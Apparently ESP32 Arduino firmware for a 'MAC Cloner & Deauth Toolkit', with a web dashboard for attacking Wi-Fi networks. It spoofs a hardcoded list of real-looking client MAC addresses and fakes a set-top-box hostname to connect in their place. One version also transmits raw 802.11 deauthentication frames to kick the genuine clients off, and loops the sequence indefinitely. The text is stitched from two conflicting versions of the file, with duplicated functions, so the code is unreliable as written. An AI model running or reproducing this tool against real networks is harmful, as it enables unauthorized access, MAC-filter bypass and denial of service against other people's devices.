    preferences.putString("saved_pass", server.arg("perm_pass"));
    preferences.end();
  }
  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleClearTarget() {
  preferences.begin("esp-store", false);
  preferences.clear();
  preferences.end();
  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleScan() {
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  
  scanResultsHTML = "<h4>Found Networks:</h4><ul>";
  for (int i = 0; i < n; ++i) {
    String netSsid = WiFi.SSID(i);
    int enc = WiFi.encryptionType(i);
    scanResultsHTML += "<li><b>" + netSsid + "</b> (" + String(WiFi.RSSI(i)) + " dBm) ";
    if (enc == WIFI_AUTH_OPEN) {
      scanResultsHTML += "<span style='color:#4ade80;'>[OPEN]</span> ";
      scanResultsHTML += "<a href='/open_connect?ssid=" + netSsid + "'>Connect Now</a>";
    } else {
      scanResultsHTML += "<span style='color:#f87171;'>[Secured]</span>";
    }
    scanResultsHTML += "</li>";
  }
  scanResultsHTML += "</ul>";
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);

  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleOpenConnect() {
  if (!server.hasArg("ssid")) {
    server.send(400, "text/plain", "SSID missing");
    return;
  }
  String targetSsid = server.arg("ssid");
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#0f172a;color:#f8fafc;font-family:sans-serif;padding:30px;text-align:center;}a{color:#38bdf8;}</style></head><body><h3>Connecting to open network: " + targetSsid + "</h3><p>Check Serial Monitor.</p><a href='/'>Back</a></body></html>");

  WiFi.mode(WIFI_STA);
  WiFi.begin(targetSsid.c_str(), NULL);
  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 8000) {
    delay(500);
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected to Open Network!");
    delay(10000);
    WiFi.disconnect(true);
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);
}

void handleStartClone() {
  if (server.hasArg("use_saved")) {
    preferences.begin("esp-store", true);
    targetSSID = preferences.getString("saved_ssid", "");
    targetPass = preferences.getString("saved_pass", "");
    preferences.end();
  } else if (server.hasArg("ssid") && server.arg("ssid").length() > 0) {
    targetSSID = server.arg("ssid");
    targetPass = server.hasArg("pass") ? server.arg("pass") : "";
  }

  if (targetSSID.length() == 0) {
    server.send(400, "text/plain", "No Target SSID specified or saved.");
    return;
  }

  holdDuration = server.hasArg("duration") ? server.arg("duration").toInt() : 5;
  infiniteLoopEnabled = server.hasArg("loop");

  selectedMacList = "";
  for (int i = 0; i < 8; i++) {
    String argName = "mac_" + String(i);
    if (server.hasArg(argName)) {
      selectedMacList += server.arg(argName) + "\n";
    }
  }

  if (server.hasArg("extrac_macs")) {
    selectedMacList += server.arg("extrac_macs") + "\n";
  }

  originalMacList = selectedMacList;

  if (!isTargetNetworkAvailable()) {
    Serial.println("\n[INIT] Target network not found initially. Entering Energy Saver state.");
    currentState = STATE_ENERGY_SAVER;
  } else {
    sessionStartTime = millis(); 
    currentState = STATE_CLONING;
  }
  
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#0f172a;color:#f8fafc;font-family:sans-serif;padding:30px;text-align:center;}a{color:#38bdf8;}</style></head><body><h3>Sequence Initialized with Energy Saver</h3><p>Check Serial Monitor for live execution feedback.</p><a href='/'>Back</a></body></html>");
}

void runCloningStateMachine() {
  if (!isTargetNetworkAvailable()) {
    Serial.println("\n[ENERGY SAVER] Target network went offline/rangeout");
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); 
    currentState = STATE_ENERGY_SAVER;
    return;
  }

  if (millis() - sessionStartTime >= ACTIVE_LIMIT_MS) {
    Serial.println("\n[RELAX MODE] Active for 1 hour.");
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ap_ssid, ap_pass); 
    coolingStartTime = millis();
    currentState = STATE_COOLING;
    return;
  }

  if (selectedMacList.length() == 0 || selectedMacList.indexOf(":") == -1) {
    if (infiniteLoopEnabled) {
      Serial.println("\n--Rotation completed--");
      selectedMacList = originalMacList;
      delay(1000);
      return;
    } else {
      Serial.println("\n--Returned to IDLE--");
      WiFi.mode(WIFI_AP);
      WiFi.softAP(ap_ssid, ap_pass);
      currentState = STATE_IDLE;
      return;
    }
  }

  int endIdx = selectedMacList.indexOf('\n');
  if (endIdx == -1) endIdx = selectedMacList.length();

  String currentMac = selectedMacList.substring(0, endIdx);
  currentMac.trim();
  
  if (endIdx < selectedMacList.length()) {
    selectedMacList = selectedMacList.substring(endIdx + 1);
  } else {
    selectedMacList = "";
  }

  if (currentMac.length() >= 17) {
    uint8_t clientMac[6];
    if (parseMacAddress(currentMac.c_str(), clientMac)) {
      if (!(clientMac[0] & 0x01)) { 
        
        WiFi.disconnect(true);
        WiFi.mode(WIFI_STA);
        delay(50);

        if (currentMac.equalsIgnoreCase("14:85:54:08:5d:ca")) {
          WiFi.setHostname("SetTopBox-4548");
        } else {
          WiFi.setHostname("esp32-device");
        }

        if (esp_wifi_set_mac(WIFI_IF_STA, clientMac) == ESP_OK) {
          Serial.printf("[MAC APPLIED ] -> %s\n", currentMac.c_str());
          
          if (targetPass.length() > 0) {
            WiFi.begin(targetSSID.c_str(), targetPass.c_str());
          } else {
            WiFi.begin(targetSSID.c_str(), NULL);
          }

          unsigned long connectStart = millis();
          bool connected = false;

          while (millis() - connectStart < 6000) {
            if (WiFi.status() == WL_CONNECTED) {
              connected = true;
              break;
            }
            delay(400);
            Serial.print(".");
          }

          if (connected) {
            int randomExtraSec = random(1, 3); 
            int dynamicHoldDuration = holdDuration + randomExtraSec;
            
            Serial.printf("\n[CONNECTED!] Holding Communication for %d seconds (Base: %d + Dynamic Extra: %d)...\n", dynamicHoldDuration, holdDuration, randomExtraSec);
            
            unsigned long holdTimer = millis();
            while (millis() - holdTimer < (dynamicHoldDuration * 1000UL)) {
              yield();
            }
            
            WiFi.disconnect(true);
            Serial.println("[DISCONNECTED]");
          } else {
            Serial.println("\n[TIMEOUT] Connection attempt skipped.");
            WiFi.disconnect(true);
          }
        }
      }
    }
  }
}

void runCoolingStateMachine() {
  if (millis() - coolingStartTime >= COOLING_DURATION_MS) {
    Serial.println("\n[RELAX MODE] Board is cool.");
    selectedMacList = originalMacList; 
    sessionStartTime = millis();      
    currentState = STATE_CLONING;
  } else {
    delay(1000);
  }
}

void runEnergySaverStateMachine() {
  Serial.println("[ENERGY SAVER] Target found offline... ");
  
  if (isTargetNetworkAvailable()) {
    Serial.println("[ENERGY SAVER] Target found online \n Resuming...");
    sessionStartTime = millis();
    currentState = STATE_CLONING;
  } else {
    delay(15000);
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);

  Serial.println("\n____________________________________________");
  Serial.println("System Ready.");
  Serial.print("Connect to AP: ");
  Serial.println(ap_ssid);
  Serial.println("Dashboard: http://192.168.4.1");
  Serial.println("____________________________________________");

  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/open_connect", HTTP_GET, handleOpenConnect);
  server.on("/start_clone", HTTP_POST, handleStartClone);
  server.on("/save_target", HTTP_POST, handleSaveTarget);
  server.on("/clear_target", HTTP_POST, handleClearTarget);

  server.begin();
}

void loop() {
  if (currentState == STATE_IDLE) {
    server.handleClient();
  } else if (currentState == STATE_CLONING) {
    runCloningStateMachine();
  } else if (currentState == STATE_COOLING) {
    runCoolingStateMachine();
  } else if (currentState == STATE_ENERGY_SAVER) {
    runEnergySaverStateMachine();
  }
  delay(2);
}
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 
    0x3A, 0x01, 
    clientMac[0], clientMac[1], clientMac[2], clientMac[3], clientMac[4], clientMac[5], 
    apMac[0],     apMac[1],     apMac[2],     apMac[3],     apMac[4],     apMac[5],     
    apMac[0],     apMac[1],     apMac[2],     apMac[3],     apMac[4],     apMac[5],     
    0x00, 0x00, 
    0x07, 0x00  
  };

  for (int i = 0; i < 5; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(5);
  }
  esp_wifi_set_promiscuous(false);
}

void handleRoot() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<title>ESP32 Controller</title></head><body style='font-family:Arial; padding:15px;'>";
  html += "<h2>ESP32 MAC Cloner & Deauth Toolkit</h2>";

  html += "<div style='border:1px solid #aaa; padding:15px; margin-bottom:15px;'>";
  html += "<h3>Mode 1: Selective MAC Cloner & Loop Control</h3>";
  html += "<form action='/start_clone' method='POST'>";
  
  html += "Target SSID:<br><input type='text' name='ssid' style='width:90%;' required><br><br>";
  html += "Password (blank if open):<br><input type='password' name='pass' style='width:90%;'><br><br>";
  
  html += "<b>Select Pre-configured MACs to Clone:</b><br>";
  String defaultMacs[] = {
    "0e:04:1a:9b:92:3f",
    "14:85:54:08:5d:ca",
    "20:51:f5:66:2f:1a",
    "70:1c:e7:a2:e0:c2",
    "e2:41:a9:f2:ee:72",
    "d2:ed:e0:54:d4:80",
    "e4:84:d3:b3:58:2d"
  };

  for (int i = 0; i < 7; i++) {
    html += "<input type='checkbox' name='mac_" + String(i) + "' value='" + defaultMacs[i] + "' checked> " + defaultMacs[i] + "<br>";
  }

  html += "<br><b>Add Extra MAC Addresses (One per line):</b><br>";
  html += "<textarea name='extrac_macs' rows='3' style='width:90%;' placeholder='AA:BB:CC:DD:EE:FF'></textarea><br><br>";

  html += "Hold Time per MAC (seconds):<br><input type='number' name='duration' value='10' style='width:90%;'><br><br>";
  
  html += "<input type='checkbox' name='loop' value='yes'> <b>Enable Infinite Loop Mode</b><br><br>";
  
  html += "<input type='submit' value='Launch Cloning Sequence' style='padding:10px 20px;'>";
  html += "</form></div>";

  html += "<div style='border:1px solid #aaa; padding:12px;'>";
  html += "<h3>Mode 2: Wi-Fi Scanner & Open Connect</h3>";
  html += "<form action='/scan' method='GET'><input type='submit' value='Scan Networks'></form>";
  html += scanResultsHTML;
  html += "</div></body></html>";

  server.send(200, "text/html", html);
}

void handleScan() {
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  
  scanResultsHTML = "<h4>Found Networks:</h4><ul>";
  for (int i = 0; i < n; ++i) {
    String netSsid = WiFi.SSID(i);
    int enc = WiFi.encryptionType(i);
    scanResultsHTML += "<li><b>" + netSsid + "</b> (" + String(WiFi.RSSI(i)) + " dBm) ";
    if (enc == WIFI_AUTH_OPEN) {
      scanResultsHTML += "<span style='color:green;'>[OPEN]</span> ";
      scanResultsHTML += "<a href='/open_connect?ssid=" + netSsid + "'>Connect Now</a>";
    } else {
      scanResultsHTML += "<span style='color:red;'>[Secured]</span>";
    }
    scanResultsHTML += "</li>";
  }
  scanResultsHTML += "</ul>";
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);

  server.sendHeader("Location", "/", true);
  server.send(303);
}

void handleOpenConnect() {
  if (!server.hasArg("ssid")) {
    server.send(400, "text/plain", "SSID missing");
    return;
  }
  String targetSsid = server.arg("ssid");
  server.send(200, "text/html", "<h3>Connecting to open network: " + targetSsid + "</h3><p>Check Serial Monitor.</p><a href='/'>Back</a>");

  WiFi.mode(WIFI_STA);
  WiFi.begin(targetSsid.c_str(), NULL);
  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 8000) {
    delay(500);
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected to Open Network!");
    delay(10000);
    WiFi.disconnect(true);
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);
}

void handleStartClone() {
  if (server.hasArg("ssid")) {
    targetSSID = server.arg("ssid");
    targetPass = server.hasArg("pass") ? server.arg("pass") : "";
    holdDuration = server.hasArg("duration") ? server.arg("duration").toInt() : 5;
    infiniteLoopEnabled = server.hasArg("loop");

    selectedMacList = "";
    for (int i = 0; i < 7; i++) {
      String argName = "mac_" + String(i);
      if (server.hasArg(argName)) {
        selectedMacList += server.arg(argName) + "\n";
      }
    }

    if (server.hasArg("extrac_macs")) {
      selectedMacList += server.arg("extrac_macs") + "\n";
    }

    originalMacList = selectedMacList;

    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks();
    bool targetFound = false;
    for (int i = 0; i < n; ++i) {
      if (WiFi.SSID(i) == targetSSID) {
        parseMacAddress(WiFi.BSSIDstr(i).c_str(), globalApMac);
        globalChannel = WiFi.channel(i);
        targetFound = true;
        break;
      }
    }
    if (!targetFound) {
      memset(globalApMac, 0xFF, 6);
      globalChannel = 1;
    }

    currentState = STATE_CLONING;
    server.send(200, "text/html", "<h3>Sequence Initialized</h3><p>Check Serial Monitor for live execution feedback.</p><a href='/'>Back</a>");
  } else {
    server.send(400, "text/plain", "Missing target SSID argument");
  }
}

void runCloningStateMachine() {
  if (selectedMacList.length() == 0 || selectedMacList.indexOf(":") == -1) {
    if (infiniteLoopEnabled) {
      Serial.println("\n--- Completed full rotation. Restarting loop ---");
      selectedMacList = originalMacList;
      delay(1000);
      return;
    } else {
      Serial.println("\n--- Sequence finished. Returning to IDLE ---");
      WiFi.mode(WIFI_AP);
      WiFi.softAP(ap_ssid, ap_pass);
      currentState = STATE_IDLE;
      return;
    }
  }

  int endIdx = selectedMacList.indexOf('\n');
  if (endIdx == -1) endIdx = selectedMacList.length();

  String currentMac = selectedMacList.substring(0, endIdx);
  currentMac.trim();
  
  if (endIdx < selectedMacList.length()) {
    selectedMacList = selectedMacList.substring(endIdx + 1);
  } else {
    selectedMacList = "";
  }

  if (currentMac.length() >= 17) {
    uint8_t clientMac[6];
    if (parseMacAddress(currentMac.c_str(), clientMac)) {
      if (!(clientMac[0] & 0x01)) { 
        
        WiFi.disconnect(true);
        WiFi.mode(WIFI_STA);
        delay(100);

        // Target-specific conditional hostname profiling
        if (currentMac.equalsIgnoreCase("14:85:54:08:5d:ca")) {
          WiFi.setHostname("SetTopBox-4548");
          Serial.println("[HOSTNAME APPLIED] -> SetTopBox-4548");
        } else {
          WiFi.setHostname("esp32-device"); // Default standard ESP32 hostname string
          Serial.println("[HOSTNAME APPLIED] -> Default ESP32 Hostname");
        }

        Serial.printf("\n[DEAUTH SENT] Targeting client MAC: %s\n", currentMac.c_str());
        sendDeauthFrame(clientMac, globalApMac, globalChannel);
        delay(50);

        if (esp_wifi_set_mac(WIFI_IF_STA, clientMac) == ESP_OK) {
          Serial.printf("[MAC APPLIED SUCCESSFULLY] -> %s\n", currentMac.c_str());
          
          if (targetPass.length() > 0) {
            WiFi.begin(targetSSID.c_str(), targetPass.c_str());
          } else {
            WiFi.begin(targetSSID.c_str(), NULL);
          }

          unsigned long connectStart = millis();
          bool connected = false;

          while (millis() - connectStart < 8000) {
            if (WiFi.status() == WL_CONNECTED) {
              connected = true;
              break;
            }
            delay(500);
            Serial.print(".");
          }

          if (connected) {
            Serial.printf("\n[CONNECTED!] Holding session for %d seconds...\n", holdDuration);
            unsigned long holdTimer = millis();
            while (millis() - holdTimer < (holdDuration * 1000UL)) {
              yield();
            }
            WiFi.disconnect(true);
            Serial.println("[DISCONNECTED] Moving to next entry...");
          } else {
            Serial.println("\n[TIMEOUT] Association rejected.");
            WiFi.disconnect(true);
          }
        }
      }
    }
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_pass);

  Serial.println("\n==========================================");
  Serial.println("System Ready.");
  Serial.print("Connect to AP: ");
  Serial.println(ap_ssid);
  Serial.println("Dashboard: http://192.168.4.1");
  Serial.println("==========================================");

  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/open_connect", HTTP_GET, handleOpenConnect);
  server.on("/start_clone", HTTP_POST, handleStartClone);

  server.begin();
}

void loop() {
  if (currentState == STATE_IDLE) {
    server.handleClient();
  } else if (currentState == STATE_CLONING) {
    runCloningStateMachine();
  }
  delay(2);
}
